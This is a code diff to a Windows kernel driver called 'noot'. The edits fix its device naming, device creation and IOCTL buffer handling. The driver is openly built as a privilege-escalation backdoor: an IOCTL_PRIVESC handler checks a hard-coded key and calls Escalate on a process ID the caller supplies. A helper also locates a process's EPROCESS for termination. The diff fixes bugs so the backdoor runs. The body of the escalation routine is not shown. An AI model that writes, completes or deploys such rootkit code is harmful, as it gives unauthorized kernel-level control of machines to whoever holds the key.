@@ -67,7 +67,7 @@ PTRLEN FindProcessEPROC(int terminate_PID)
 
 VOID IocUnload(PDRIVER_OBJECT driverObject) {
     PDEVICE_OBJECT devObj = driverObject->DeviceObject;
-    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Driver\\noot");
+    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\noot");
 
     IoDeleteSymbolicLink(&devName);
     if (devObj) IoDeleteDevice(devObj);
@@ -151,11 +151,11 @@ DriverEntry(
 {
     UNREFERENCED_PARAMETER(RegistryPath);
 
-    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Driver\\noot");
+    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\noot");
     UNICODE_STRING dosName = RTL_CONSTANT_STRING(L"\\DosDevices\\noot");
     PDEVICE_OBJECT devObj;
 
-    NTSTATUS res = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_BEEP, FILE_DEVICE_SECURE_OPEN, TRUE, &devObj);
+    NTSTATUS res = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &devObj);
 
     if (!NT_SUCCESS(res)) { handleError(res, "IoCreateDevice, Status code: "); return res; }
 
@@ -183,17 +183,15 @@ NTSTATUS IoctlHandler(PDEVICE_OBJECT devObj, PIRP irp) {
     UNREFERENCED_PARAMETER(devObj);
     irpSp = IoGetCurrentIrpStackLocation(irp);
     inBufLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
-    outBufLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
-    PELEVATOR buf = { 0 };
+    PELEVATOR buf = (PELEVATOR)irp->AssociatedIrp.SystemBuffer;
 
-    if (!inBufLen || !outBufLen) {
+    if (!inBufLen) {
         ntStatus = STATUS_INVALID_PARAMETER;
         goto End;
     }
 
     switch (irpSp->Parameters.DeviceIoControl.IoControlCode) {
     case IOCTL_PRIVESC:
-        buf = (PELEVATOR)irp->AssociatedIrp.SystemBuffer;
         if (buf->key == KEY) {
             NTSTATUS res = Escalate(buf->pid);
             if (!NT_SUCCESS(res)) { handleError(res, "Escalate, Status code: "); return res; }
